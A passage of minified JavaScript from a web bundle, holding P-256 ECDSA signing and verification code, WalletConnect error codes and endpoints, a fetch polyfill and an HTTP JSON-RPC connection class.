b=="bigint"?b:to(Zn("private key",b,x))}catch{throw new Error("invalid private key, expected hex or "+x+" bytes, got "+typeof b)}return S&&($=Ln($,O)),Di("private key",$,Vt,O),$}function f(b){if(!(b instanceof g))throw new Error("ProjectivePoint expected")}const d=hm((b,m)=>{const{px:x,py:S,pz:O}=b;if(n.eql(O,n.ONE))return{x,y:S};const $=b.is0();m==null&&(m=$?n.ONE:n.inv(O));const R=n.mul(x,m),T=n.mul(S,m),D=n.mul(O,m);if($)return{x:n.ZERO,y:n.ZERO};if(!n.eql(D,n.ONE))throw new Error("invZ was invalid");return{x:R,y:T}}),y=hm(b=>{if(b.is0()){if(e.allowInfinityPoint&&!n.is0(b.py))return;throw new Error("bad point: ZERO")}const{x:m,y:x}=b.toAffine();if(!n.isValid(m)||!n.isValid(x))throw new Error("bad point: x or y not FE");const S=n.sqr(x),O=l(m);if(!n.eql(S,O))throw new Error("bad point: equation left != right");if(!b.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});class g{constructor(m,x,S){if(this.px=m,this.py=x,this.pz=S,m==null||!n.isValid(m))throw new Error("x required");if(x==null||!n.isValid(x))throw new Error("y required");if(S==null||!n.isValid(S))throw new Error("z required");Object.freeze(this)}static fromAffine(m){const{x,y:S}=m||{};if(!m||!n.isValid(x)||!n.isValid(S))throw new Error("invalid affine point");if(m instanceof g)throw new Error("projective point not allowed");const O=$=>n.eql($,n.ZERO);return O(x)&&O(S)?g.ZERO:new g(x,S,n.ONE)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static normalizeZ(m){const x=n.invertBatch(m.map(S=>S.pz));return m.map((S,O)=>S.toAffine(x[O])).map(g.fromAffine)}static fromHex(m){const x=g.fromAffine(o(Zn("pointHex",m)));return x.assertValidity(),x}static fromPrivateKey(m){return g.BASE.multiply(u(m))}static msm(m,x){return Dz(g,r,m,x)}_setWindowSize(m){w.setWindowSize(this,m)}assertValidity(){y(this)}hasEvenY(){const{y:m}=this.toAffine();if(n.isOdd)return!n.isOdd(m);throw new Error("Field doesn't support isOdd")}equals(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m,D=n.eql(n.mul(x,T),n.mul($,O)),B=n.eql(n.mul(S,T),n.mul(R,O));return D&&B}negate(){return new g(this.px,n.neg(this.py),this.pz)}double(){const{a:m,b:x}=e,S=n.mul(x,K2),{px:O,py:$,pz:R}=this;let T=n.ZERO,D=n.ZERO,B=n.ZERO,k=n.mul(O,O),G=n.mul($,$),W=n.mul(R,R),J=n.mul(O,$);return J=n.add(J,J),B=n.mul(O,R),B=n.add(B,B),T=n.mul(m,B),D=n.mul(S,W),D=n.add(T,D),T=n.sub(G,D),D=n.add(G,D),D=n.mul(T,D),T=n.mul(J,T),B=n.mul(S,B),W=n.mul(m,W),J=n.sub(k,W),J=n.mul(m,J),J=n.add(J,B),B=n.add(k,k),k=n.add(B,k),k=n.add(k,W),k=n.mul(k,J),D=n.add(D,k),W=n.mul($,R),W=n.add(W,W),k=n.mul(W,J),T=n.sub(T,k),B=n.mul(W,G),B=n.add(B,B),B=n.add(B,B),new g(T,D,B)}add(m){f(m);const{px:x,py:S,pz:O}=this,{px:$,py:R,pz:T}=m;let D=n.ZERO,B=n.ZERO,k=n.ZERO;const G=e.a,W=n.mul(e.b,K2);let J=n.mul(x,$),ne=n.mul(S,R),j=n.mul(O,T),A=n.add(x,S),C=n.add($,R);A=n.mul(A,C),C=n.add(J,ne),A=n.sub(A,C),C=n.add(x,O);let U=n.add($,T);return C=n.mul(C,U),U=n.add(J,j),C=n.sub(C,U),U=n.add(S,O),D=n.add(R,T),U=n.mul(U,D),D=n.add(ne,j),U=n.sub(U,D),k=n.mul(G,C),D=n.mul(W,j),k=n.add(D,k),D=n.sub(ne,k),k=n.add(ne,k),B=n.mul(D,k),ne=n.add(J,J),ne=n.add(ne,J),j=n.mul(G,j),C=n.mul(W,C),ne=n.add(ne,j),j=n.sub(J,j),j=n.mul(G,j),C=n.add(C,j),J=n.mul(ne,C),B=n.add(B,J),J=n.mul(U,C),D=n.mul(A,D),D=n.sub(D,J),J=n.mul(A,ne),k=n.mul(U,k),k=n.add(k,J),new g(D,B,k)}subtract(m){return this.add(m.negate())}is0(){return this.equals(g.ZERO)}wNAF(m){return w.wNAFCached(this,m,g.normalizeZ)}multiplyUnsafe(m){const{endo:x,n:S}=e;Di("scalar",m,Pi,S);const O=g.ZERO;if(m===Pi)return O;if(this.is0()||m===Vt)return this;if(!x||w.hasPrecomputes(this))return w.wNAFCachedUnsafe(this,m,g.normalizeZ);let{k1neg:$,k1:R,k2neg:T,k2:D}=x.splitScalar(m),B=O,k=O,G=this;for(;R>Pi||D>Pi;)R&Vt&&(B=B.add(G)),D&Vt&&(k=k.add(G)),G=G.double(),R>>=Vt,D>>=Vt;return $&&(B=B.negate()),T&&(k=k.negate()),k=new g(n.mul(k.px,x.beta),k.py,k.pz),B.add(k)}multiply(m){const{endo:x,n:S}=e;Di("scalar",m,Vt,S);let O,$;if(x){const{k1neg:R,k1:T,k2neg:D,k2:B}=x.splitScalar(m);let{p:k,f:G}=this.wNAF(T),{p:W,f:J}=this.wNAF(B);k=w.constTimeNegate(R,k),W=w.constTimeNegate(D,W),W=new g(n.mul(W.px,x.beta),W.py,W.pz),O=k.add(W),$=G.add(J)}else{const{p:R,f:T}=this.wNAF(m);O=R,$=T}return g.normalizeZ([O,$])[0]}multiplyAndAddUnsafe(m,x,S){const O=g.BASE,$=(T,D)=>D===Pi||D===Vt||!T.equals(O)?T.multiplyUnsafe(D):T.multiply(D),R=$(this,x).add($(m,S));return R.is0()?void 0:R}toAffine(m){return d(this,m)}isTorsionFree(){const{h:m,isTorsionFree:x}=e;if(m===Vt)return!0;if(x)return x(g,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:m,clearCofactor:x}=e;return m===Vt?this:x?x(g,this):this.multiplyUnsafe(e.h)}toRawBytes(m=!0){return Ma("isCompressed",m),this.assertValidity(),i(g,this,m)}toHex(m=!0){return Ma("isCompressed",m),Fa(this.toRawBytes(m))}}g.BASE=new g(e.Gx,e.Gy,n.ONE),g.ZERO=new g(n.ZERO,n.ONE,n.ZERO);const E=e.nBitLength,w=Rz(g,e.endo?Math.ceil(E/2):E);return{CURVE:e,ProjectivePoint:g,normPrivateKeyToScalar:u,weierstrassEquation:l,isWithinCurveOrder:c}}function Wz(t){const e=lO(t);return el(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function Kz(t){const e=Wz(t),{Fp:n,n:r}=e,i=n.BYTES+1,o=2*n.BYTES+1;function l(j){return Ln(j,r)}function c(j){return dm(j,r)}const{ProjectivePoint:u,normPrivateKeyToScalar:f,weierstrassEquation:d,isWithinCurveOrder:y}=Vz({...e,toBytes(j,A,C){const U=A.toAffine(),M=n.toBytes(U.x),N=Tc;return Ma("isCompressed",C),C?N(Uint8Array.from([A.hasEvenY()?2:3]),M):N(Uint8Array.from([4]),M,n.toBytes(U.y))},fromBytes(j){const A=j.length,C=j[0],U=j.subarray(1);if(A===i&&(C===2||C===3)){const M=to(U);if(!Wf(M,Vt,n.ORDER))throw new Error("Point is not on curve");const N=d(M);let V;try{V=n.sqrt(N)}catch(q){const Q=q instanceof Error?": "+q.message:"";throw new Error("Point is not on curve"+Q)}const F=(V&Vt)===Vt;return(C&1)===1!==F&&(V=n.neg(V)),{x:M,y:V}}else if(A===o&&C===4){const M=n.fromBytes(U.subarray(0,n.BYTES)),N=n.fromBytes(U.subarray(n.BYTES,2*n.BYTES));return{x:M,y:N}}else{const M=i,N=o;throw new Error("invalid Point, expected length of "+M+", or uncompressed "+N+", got "+A)}}}),g=j=>Fa(qa(j,e.nByteLength));function E(j){const A=r>>Vt;return j>A}function w(j){return E(j)?l(-j):j}const b=(j,A,C)=>to(j.slice(A,C));class m{constructor(A,C,U){this.r=A,this.s=C,this.recovery=U,this.assertValidity()}static fromCompact(A){const C=e.nByteLength;return A=Zn("compactSignature",A,C*2),new m(b(A,0,C),b(A,C,2*C))}static fromDER(A){const{r:C,s:U}=Ii.toSig(Zn("DER",A));return new m(C,U)}assertValidity(){Di("r",this.r,Vt,r),Di("s",this.s,Vt,r)}addRecoveryBit(A){return new m(this.r,this.s,A)}recoverPublicKey(A){const{r:C,s:U,recovery:M}=this,N=T(Zn("msgHash",A));if(M==null||![0,1,2,3].includes(M))throw new Error("recovery id invalid");const V=M===2||M===3?C+e.n:C;if(V>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const F=(M&1)===0?"02":"03",q=u.fromHex(F+g(V)),Q=c(V),te=l(-N*Q),se=l(U*Q),le=u.BASE.multiplyAndAddUnsafe(q,te,se);if(!le)throw new Error("point at infinify");return le.assertValidity(),le}hasHighS(){return E(this.s)}normalizeS(){return this.hasHighS()?new m(this.r,l(-this.s),this.recovery):this}toDERRawBytes(){return za(this.toDERHex())}toDERHex(){return Ii.hexFromSig({r:this.r,s:this.s})}toCompactRawBytes(){return za(this.toCompactHex())}toCompactHex(){return g(this.r)+g(this.s)}}const x={isValidPrivateKey(j){try{return f(j),!0}catch{return!1}},normPrivateKeyToScalar:f,randomPrivateKey:()=>{const j=sO(e.n);return Tz(e.randomBytes(j),e.n)},precompute(j=8,A=u.BASE){return A._setWindowSize(j),A.multiply(BigInt(3)),A}};function S(j,A=!0){return u.fromPrivateKey(j).toRawBytes(A)}function O(j){const A=lo(j),C=typeof j=="string",U=(A||C)&&j.length;return A?U===i||U===o:C?U===2*i||U===2*o:j instanceof u}function $(j,A,C=!0){if(O(j))throw new Error("first arg must be private key");if(!O(A))throw new Error("second arg must be public key");return u.fromHex(A).multiply(f(j)).toRawBytes(C)}const R=e.bits2int||function(j){if(j.length>8192)throw new Error("input is too large");const A=to(j),C=j.length*8-e.nBitLength;return C>0?A>>BigInt(C):A},T=e.bits2int_modN||function(j){return l(R(j))},D=pw(e.nBitLength);function B(j){return Di("num < 2^"+e.nBitLength,j,Pi,D),qa(j,e.nByteLength)}function k(j,A,C=G){if(["recovered","canonical"].some(he=>he in C))throw new Error("sign() legacy options not supported");const{hash:U,randomBytes:M}=e;let{lowS:N,prehash:V,extraEntropy:F}=C;N==null&&(N=!0),j=Zn("msgHash",j),W2(C),V&&(j=Zn("prehashed msgHash",U(j)));const q=T(j),Q=f(A),te=[B(Q),B(q)];if(F!=null&&F!==!1){const he=F===!0?M(n.BYTES):F;te.push(Zn("extraEntropy",he))}const se=Tc(...te),le=q;function pe(he){const fe=R(he);if(!y(fe))return;const xe=c(fe),Oe=u.BASE.multiply(fe).toAffine(),Pe=l(Oe.x);if(Pe===Pi)return;const Re=l(xe*l(le+Pe*Q));if(Re===Pi)return;let Ue=(Oe.x===Pe?0:2)|Number(Oe.y&Vt),Zt=Re;return N&&E(Re)&&(Zt=w(Re),Ue^=1),new m(Pe,Zt,Ue)}return{seed:se,k2sig:pe}}const G={lowS:e.lowS,prehash:!1},W={lowS:e.lowS,prehash:!1};function J(j,A,C=G){const{seed:U,k2sig:M}=k(j,A,C),N=e;return eO(N.hash.outputLen,N.nByteLength,N.hmac)(U,M)}u.BASE._setWindowSize(8);function ne(j,A,C,U=W){var Re;const M=j;A=Zn("msgHash",A),C=Zn("publicKey",C);const{lowS:N,prehash:V,format:F}=U;if(W2(U),"strict"in U)throw new Error("options.strict was renamed to lowS");if(F!==void 0&&F!=="compact"&&F!=="der")throw new Error("format must be compact or der");const q=typeof M=="string"||lo(M),Q=!q&&!F&&typeof M=="object"&&M!==null&&typeof M.r=="bigint"&&typeof M.s=="bigint";if(!q&&!Q)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let te,se;try{if(Q&&(te=new m(M.r,M.s)),q){try{F!=="compact"&&(te=m.fromDER(M))}catch(Ue){if(!(Ue instanceof Ii.Err))throw Ue}!te&&F!=="der"&&(te=m.fromCompact(M))}se=u.fromHex(C)}catch{return!1}if(!te||N&&te.hasHighS())return!1;V&&(A=e.hash(A));const{r:le,s:pe}=te,he=T(A),fe=c(pe),xe=l(he*fe),Oe=l(le*fe),Pe=(Re=u.BASE.multiplyAndAddUnsafe(se,xe,Oe))==null?void 0:Re.toAffine();return Pe?l(Pe.x)===le:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:$,sign:J,verify:ne,ProjectivePoint:u,Signature:m,utils:x}}function Gz(t){return{hash:t,hmac:(e,...n)=>QI(t,e,O7(...n)),randomBytes:HI}}function Yz(t,e){const n=r=>Kz({...t,...Gz(r)});return{...n(e),create:n}}const cO=rO(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff")),Jz=cO.create(BigInt("-3")),Zz=BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b");Yz({a:Jz,b:Zz,Fp:cO,n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),h:BigInt(1),lowS:!1},hz);function gw(t){return t.includes(":")}function hc(t){return gw(t)?t.split(":")[0]:t}const Qz={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}};function G2(t,e){const{message:n,code:r}=Qz[t];return{message:e?`${n} ${e}`:n,code:r}}function ry(t,e){return!!Array.isArray(t)}function Xz(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}var Ch={exports:{}},Y2;function eq(){return Y2||(Y2=1,function(t,e){var n=typeof globalThis<"u"&&globalThis||typeof self<"u"&&self||typeof globalThis<"u"&&globalThis,r=function(){function o(){this.fetch=!1,this.DOMException=n.DOMException}return o.prototype=n,new o}();(function(o){(function(l){var c=typeof o<"u"&&o||typeof self<"u"&&self||typeof o<"u"&&o||{},u={searchParams:"URLSearchParams"in c,iterable:"Symbol"in c&&"iterator"in Symbol,blob:"FileReader"in c&&"Blob"in c&&function(){try{return new Blob,!0}catch{return!1}}(),formData:"FormData"in c,arrayBuffer:"ArrayBuffer"in c};function f(A){return A&&DataView.prototype.isPrototypeOf(A)}if(u.arrayBuffer)var d=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],y=ArrayBuffer.isView||function(A){return A&&d.indexOf(Object.prototype.toString.call(A))>-1};function g(A){if(typeof A!="string"&&(A=String(A)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(A)||A==="")throw new TypeError('Invalid character in header field name: "'+A+'"');return A.toLowerCase()}function E(A){return typeof A!="string"&&(A=String(A)),A}function w(A){var C={next:function(){var U=A.shift();return{done:U===void 0,value:U}}};return u.iterable&&(C[Symbol.iterator]=function(){return C}),C}function b(A){this.map={},A instanceof b?A.forEach(function(C,U){this.append(U,C)},this):Array.isArray(A)?A.forEach(function(C){if(C.length!=2)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+C.length);this.append(C[0],C[1])},this):A&&Object.getOwnPropertyNames(A).forEach(function(C){this.append(C,A[C])},this)}b.prototype.append=function(A,C){A=g(A),C=E(C);var U=this.map[A];this.map[A]=U?U+", "+C:C},b.prototype.delete=function(A){delete this.map[g(A)]},b.prototype.get=function(A){return A=g(A),this.has(A)?this.map[A]:null},b.prototype.has=function(A){return this.map.hasOwnProperty(g(A))},b.prototype.set=function(A,C){this.map[g(A)]=E(C)},b.prototype.forEach=function(A,C){for(var U in this.map)this.map.hasOwnProperty(U)&&A.call(C,this.map[U],U,this)},b.prototype.keys=function(){var A=[];return this.forEach(function(C,U){A.push(U)}),w(A)},b.prototype.values=function(){var A=[];return this.forEach(function(C){A.push(C)}),w(A)},b.prototype.entries=function(){var A=[];return this.forEach(function(C,U){A.push([U,C])}),w(A)},u.iterable&&(b.prototype[Symbol.iterator]=b.prototype.entries);function m(A){if(!A._noBody){if(A.bodyUsed)return Promise.reject(new TypeError("Already read"));A.bodyUsed=!0}}function x(A){return new Promise(function(C,U){A.onload=function(){C(A.result)},A.onerror=function(){U(A.error)}})}function S(A){var C=new FileReader,U=x(C);return C.readAsArrayBuffer(A),U}function O(A){var C=new FileReader,U=x(C),M=/charset=([A-Za-z0-9_-]+)/.exec(A.type),N=M?M[1]:"utf-8";return C.readAsText(A,N),U}function $(A){for(var C=new Uint8Array(A),U=new Array(C.length),M=0;M<C.length;M++)U[M]=String.fromCharCode(C[M]);return U.join("")}function R(A){if(A.slice)return A.slice(0);var C=new Uint8Array(A.byteLength);return C.set(new Uint8Array(A)),C.buffer}function T(){return this.bodyUsed=!1,this._initBody=function(A){this.bodyUsed=this.bodyUsed,this._bodyInit=A,A?typeof A=="string"?this._bodyText=A:u.blob&&Blob.prototype.isPrototypeOf(A)?this._bodyBlob=A:u.formData&&FormData.prototype.isPrototypeOf(A)?this._bodyFormData=A:u.searchParams&&URLSearchParams.prototype.isPrototypeOf(A)?this._bodyText=A.toString():u.arrayBuffer&&u.blob&&f(A)?(this._bodyArrayBuffer=R(A.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):u.arrayBuffer&&(ArrayBuffer.prototype.isPrototypeOf(A)||y(A))?this._bodyArrayBuffer=R(A):this._bodyText=A=Object.prototype.toString.call(A):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||(typeof A=="string"?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):u.searchParams&&URLSearchParams.prototype.isPrototypeOf(A)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},u.blob&&(this.blob=function(){var A=m(this);if(A)return A;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer){var A=m(this);return A||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer))}else{if(u.blob)return this.blob().then(S);throw new Error("could not read as ArrayBuffer")}},this.text=function(){var A=m(this);if(A)return A;if(this._bodyBlob)return O(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve($(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},u.formData&&(this.formData=function(){return this.text().then(G)}),this.json=function(){return this.text().then(JSON.parse)},this}var D=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function B(A){var C=A.toUpperCase();return D.indexOf(C)>-1?C:A}function k(A,C){if(!(this instanceof k))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');C=C||{};var U=C.body;if(A instanceof k){if(A.bodyUsed)throw new TypeError("Already read");this.url=A.url,this.credentials=A.credentials,C.headers||(this.headers=new b(A.headers)),this.method=A.method,this.mode=A.mode,this.signal=A.signal,!U&&A._bodyInit!=null&&(U=A._bodyInit,A.bodyUsed=!0)}else this.url=String(A);if(this.credentials=C.credentials||this.credentials||"same-origin",(C.headers||!this.headers)&&(this.headers=new b(C.headers)),this.method=B(C.method||this.method||"GET"),this.mode=C.mode||this.mode||null,this.signal=C.signal||this.signal||function(){if("AbortController"in c){var V=new AbortController;return V.signal}}(),this.referrer=null,(this.method==="GET"||this.method==="HEAD")&&U)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(U),(this.method==="GET"||this.method==="HEAD")&&(C.cache==="no-store"||C.cache==="no-cache")){var M=/([?&])_=[^&]*/;if(M.test(this.url))this.url=this.url.replace(M,"$1_="+new Date().getTime());else{var N=/\?/;this.url+=(N.test(this.url)?"&":"?")+"_="+new Date().getTime()}}}k.prototype.clone=function(){return new k(this,{body:this._bodyInit})};function G(A){var C=new FormData;return A.trim().split("&").forEach(function(U){if(U){var M=U.split("="),N=M.shift().replace(/\+/g," "),V=M.join("=").replace(/\+/g," ");C.append(decodeURIComponent(N),decodeURIComponent(V))}}),C}function W(A){var C=new b,U=A.replace(/\r?\n[\t ]+/g," ");return U.split("\r").map(function(M){return M.indexOf(`
`)===0?M.substr(1,M.length):M}).forEach(function(M){var N=M.split(":"),V=N.shift().trim();if(V){var F=N.join(":").trim();try{C.append(V,F)}catch(q){console.warn("Response "+q.message)}}}),C}T.call(k.prototype);function J(A,C){if(!(this instanceof J))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(C||(C={}),this.type="default",this.status=C.status===void 0?200:C.status,this.status<200||this.status>599)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=this.status>=200&&this.status<300,this.statusText=C.statusText===void 0?"":""+C.statusText,this.headers=new b(C.headers),this.url=C.url||"",this._initBody(A)}T.call(J.prototype),J.prototype.clone=function(){return new J(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new b(this.headers),url:this.url})},J.error=function(){var A=new J(null,{status:200,statusText:""});return A.ok=!1,A.status=0,A.type="error",A};var ne=[301,302,303,307,308];J.redirect=function(A,C){if(ne.indexOf(C)===-1)throw new RangeError("Invalid status code");return new J(null,{status:C,headers:{location:A}})},l.DOMException=c.DOMException;try{new l.DOMException}catch{l.DOMException=function(C,U){this.message=C,this.name=U;var M=Error(C);this.stack=M.stack},l.DOMException.prototype=Object.create(Error.prototype),l.DOMException.prototype.constructor=l.DOMException}function j(A,C){return new Promise(function(U,M){var N=new k(A,C);if(N.signal&&N.signal.aborted)return M(new l.DOMException("Aborted","AbortError"));var V=new XMLHttpRequest;function F(){V.abort()}V.onload=function(){var te={statusText:V.statusText,headers:W(V.getAllResponseHeaders()||"")};N.url.indexOf("file://")===0&&(V.status<200||V.status>599)?te.status=200:te.status=V.status,te.url="responseURL"in V?V.responseURL:te.headers.get("X-Request-URL");var se="response"in V?V.response:V.responseText;setTimeout(function(){U(new J(se,te))},0)},V.onerror=function(){setTimeout(function(){M(new TypeError("Network request failed"))},0)},V.ontimeout=function(){setTimeout(function(){M(new TypeError("Network request timed out"))},0)},V.onabort=function(){setTimeout(function(){M(new l.DOMException("Aborted","AbortError"))},0)};function q(te){try{return te===""&&c.location.href?c.location.href:te}catch{return te}}if(V.open(N.method,q(N.url),!0),N.credentials==="include"?V.withCredentials=!0:N.credentials==="omit"&&(V.withCredentials=!1),"responseType"in V&&(u.blob?V.responseType="blob":u.arrayBuffer&&(V.responseType="arraybuffer")),C&&typeof C.headers=="object"&&!(C.headers instanceof b||c.Headers&&C.headers instanceof c.Headers)){var Q=[];Object.getOwnPropertyNames(C.headers).forEach(function(te){Q.push(g(te)),V.setRequestHeader(te,E(C.headers[te]))}),N.headers.forEach(function(te,se){Q.indexOf(se)===-1&&V.setRequestHeader(se,te)})}else N.headers.forEach(function(te,se){V.setRequestHeader(se,te)});N.signal&&(N.signal.addEventListener("abort",F),V.onreadystatechange=function(){V.readyState===4&&N.signal.removeEventListener("abort",F)}),V.send(typeof N._bodyInit>"u"?null:N._bodyInit)})}return j.polyfill=!0,c.fetch||(c.fetch=j,c.Headers=b,c.Request=k,c.Response=J),l.Headers=b,l.Request=k,l.Response=J,l.fetch=j,Object.defineProperty(l,"__esModule",{value:!0}),l})({})})(r),r.fetch.ponyfill=!0,delete r.fetch.polyfill;var i=n.fetch?n:r;e=i.fetch,e.default=i.fetch,e.fetch=i.fetch,e.Headers=i.Headers,e.Request=i.Request,e.Response=i.Response,t.exports=e}(Ch,Ch.exports)),Ch.exports}var tq=eq();const J2=yf(tq),nq=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),rq=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function iq(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return rq(t)}catch{return t}}function Z2(t){return typeof t=="string"?t:nq(t)||""}var sq=Object.defineProperty,oq=Object.defineProperties,aq=Object.getOwnPropertyDescriptors,Q2=Object.getOwnPropertySymbols,lq=Object.prototype.hasOwnProperty,cq=Object.prototype.propertyIsEnumerable,X2=(t,e,n)=>e in t?sq(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ex=(t,e)=>{for(var n in e||(e={}))lq.call(e,n)&&X2(t,n,e[n]);if(Q2)for(var n of Q2(e))cq.call(e,n)&&X2(t,n,e[n]);return t},tx=(t,e)=>oq(t,aq(e));const uq={Accept:"application/json","Content-Type":"application/json"},hq="POST",nx={headers:uq,method:hq},rx=10;let Br=class{constructor(e,n=!1){if(this.url=e,this.disableProviderPing=n,this.events=new rr.EventEmitter,this.isAvailable=!1,this.registering=!1,!GE(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=n}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e){this.isAvailable||await this.register();try{const n=Z2(e),r=await(await J2(this.url,tx(ex({},nx),{body:n}))).json();this.onPayload({data:r})}catch(n){this.onError(e.id,n)}}async register(e=this.url){if(!GE(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const n=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=n||this.events.listenerCount("open")>=n)&&this.events.setMaxListeners(n+1),new Promise((r,i)=>{this.events.once("register_error",o=>{this.resetMaxListeners(),i(o)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return i(new Error("HTTP connection is missing or invalid"));r()})})}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const n=Z2({id:1,jsonrpc:"2.0",method:"test",params:[]});await J2(e,tx(ex({},nx),{body:n}))}this.onOpen()}catch(n){const r=this.parseError(n);throw this.events.emit("register_error",r),this.onClose(),r}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const n=typeof e.data=="string"?iq(e.data):e.data;this.events.emit("payload",n)}onError(e,n){const r=this.parseError(n),i=r.message||r.toString(),o=jf(e,i);this.events.emit("payload",o)}parseError(e,n=this.url){return yI(e,n,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>rx&&this.events.setMaxListeners(rx)}};const ix="error",fq="wss://relay.walletconnect.org",dq="wc",pq="universal_provider",Rh=`${dq}@2:${pq}:`,uO="https://rpc.walletconnect.org/v1/",ga="generic",gq=`${uO}bundler`,yr={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};function yq(){}function yw(t){return t==null||typeof t!="object"&&typeof t!="function"}function mw(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)}function mq(t){if(yw(t))return t;if(Array.isArray(t)||mw(t)||t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);const e=Object.getPrototypeOf(t),n=e.constructor;if(t instanceof Date||t instanceof Map||t instanceof Set)return new n(t);if(t instanceof RegExp){const r=new n(t);return r.lastIndex=t.lastIndex,r}if(t instanceof DataView)return new n(t.buffer.slice(0));if(t instanceof Error){const r=new n(t.message);return r.stack=t.stack,r.name=t.name,r.cause=t.cause,r}if(typeof File<"u"&&t instanceof File)return new n([t],t.name,{type:t.type,lastModified:t.lastModified});if(typeof t=="object"){const 